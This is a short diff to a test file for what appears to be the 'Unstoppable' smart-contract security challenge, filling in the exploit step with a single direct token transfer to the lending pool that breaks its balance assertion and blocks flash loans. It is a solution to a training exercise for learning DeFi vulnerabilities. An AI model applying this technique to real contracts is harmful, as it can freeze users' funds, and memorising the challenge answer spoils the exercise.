@@ -40,6 +40,11 @@ describe('[Challenge] Unstoppable', function () {
 
     it('Exploit', async function () {
         /** YOUR EXPLOIT GOES HERE */
+        
+        /**
+         * Transferring token to the pool contract to unequate the assert
+         */
+        await this.token.transfer(this.pool.address, ether('100'), { from: attacker })
     });
 
     after(async function () {
